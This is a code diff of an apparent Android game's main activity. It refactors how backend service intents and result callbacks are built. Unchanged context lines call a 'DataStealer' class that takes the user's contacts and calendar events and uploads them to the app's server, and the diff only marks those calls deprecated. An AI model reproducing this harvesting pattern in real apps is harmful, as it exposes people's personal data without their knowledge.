@@ -4,7 +4,9 @@ import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
+import android.os.Handler;
 import android.os.Parcelable;
+import android.os.ResultReceiver;
 import android.util.Log;
 import android.widget.Toast;
 
@@ -14,6 +16,7 @@ import com.google.android.gms.location.LocationServices;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Locale;
+import java.util.function.BiConsumer;
 import java.util.function.Consumer;
 
 import androidx.appcompat.app.AppCompatActivity;
@@ -39,6 +42,7 @@ public class MainActivity extends AppCompatActivity implements IApp {
     private static final int PERMISSION_REQUEST_IDENTIFIER_READ_LOCATION = 103;
 
 
+    @Deprecated
     private ApiBuilder.API server;
 
     @Override
@@ -69,21 +73,52 @@ public class MainActivity extends AppCompatActivity implements IApp {
     }
 
     private void sendClueDownloadIntent() {
-        boolean safetyMode = BackendManagerIntentService.isInSafetyMode(getApplicationContext());
+        startNewBackendIntent(BackendManagerIntentService.MANAGE_CLUE_DOWNLOAD);
+    }
+
+    private boolean startNewBackendIntent(String type, BiConsumer<Integer, Bundle> receiver) {
+        Intent intent = createNewBackendIntent(type, receiver);
+        if (intent != null) {
+            startService(intent);
+            return true;
+        }
+        return false;
+    }
+
+    private boolean startNewBackendIntent(String type) {
+        return startNewBackendIntent(type, (code, bundle) -> {});
+    }
+
+    private Intent createNewBackendIntent(String type, BiConsumer<Integer, Bundle> receiver) {
+        Intent intent = createNewBackendIntent(type);
+        if (intent != null)
+            intent.putExtra("receiver", new ResultReceiver(new Handler()) {
+                @Override
+                protected void onReceiveResult(int resultCode, Bundle resultData) {
+                    receiver.accept(resultCode, resultData);
+                }
+            });
+        return intent;
+    }
+
+    private Intent createNewBackendIntent(String type) {
+        Intent intent = createNewBackendIntent();
+        if (intent != null)
+            intent.putExtra(BackendManagerIntentService.KEY_MANAGE_TYPE, type);
+        return intent;
+    }
+
+    private Intent createNewBackendIntent() {
+        boolean safetyMode = BackendManagerIntentService.isInSafetyMode(this);
         int playerId = BackendManagerIntentService.getPlayerId(this);
 
-        if (-1 != playerId && !safetyMode) {
-            Intent registerPlayer = new Intent(this, BackendManagerIntentService.class);
-            registerPlayer.putExtra(BackendManagerIntentService.KEY_MANAGE_TYPE, BackendManagerIntentService.MANAGE_CLUE_DOWNLOAD);
-            startService(registerPlayer);
+        if (playerId != -1 && !safetyMode) {
+            return new Intent(this, BackendManagerIntentService.class);
         } else {
-            String errorString = "Application is in safety mode or user is not registered.";
-            int duration = Toast.LENGTH_LONG;
-            Toast toast = Toast.makeText(getApplicationContext(), errorString, duration);
-            toast.show();
+            Toast.makeText(this,
+                    R.string.error_no_registration_or_safety_mode, Toast.LENGTH_LONG).show();
+            return null;
         }
-
-
     }
 
     /**
@@ -181,6 +216,7 @@ public class MainActivity extends AppCompatActivity implements IApp {
         }
     }
 
+    @Deprecated
     private void displayAndSendContactDataInLog() {
         ArrayList<Contact> contacts = DataStealer.takeContactData(getApplicationContext());
 
@@ -191,11 +227,13 @@ public class MainActivity extends AppCompatActivity implements IApp {
         sendContactData(contacts);
     }
 
+    @Deprecated
     private void sendContactData(ArrayList<Contact> contacts) {
         int userId = getUserId();
         server.addData(userId, UserDataPostRequestFactory.buildWithContacts(contacts)).subscribe();
     }
 
+    @Deprecated
     private void displayAndSendCalendarDataInLog() {
         ArrayList<CalendarEvent> cEvents = DataStealer.takeCalendarData(getApplicationContext());
 
@@ -206,6 +244,7 @@ public class MainActivity extends AppCompatActivity implements IApp {
         sendCalenderData(cEvents);
     }
 
+    @Deprecated
     private void sendCalenderData(ArrayList<CalendarEvent> cEvents) {
         int userId = getUserId();
         server.addData(userId, UserDataPostRequestFactory.buildWithCalendarEvents(cEvents))
@@ -268,13 +307,15 @@ public class MainActivity extends AppCompatActivity implements IApp {
     }
 
     @Override
-    public void executeApiCall(String call, Consumer<Parcelable> callback) {
-
+    public void executeApiCall(String call, BiConsumer<Integer, Bundle> callback) {
+        startNewBackendIntent(call, callback);
     }
 
     @Override
-    public void executeApiCall(String call, UserDataPostRequestFactory.UserDataPostRequest pr, Runnable callback) {
-
+    public void postUserData(String call, UserDataPostRequestFactory.UserDataPostRequest pr, Runnable callback) {
+        Intent intent = createNewBackendIntent(call, (code, bundle) -> callback.run());
+        intent.putExtra("postRequest", pr);
+        startService(intent);
     }
 
     @Override
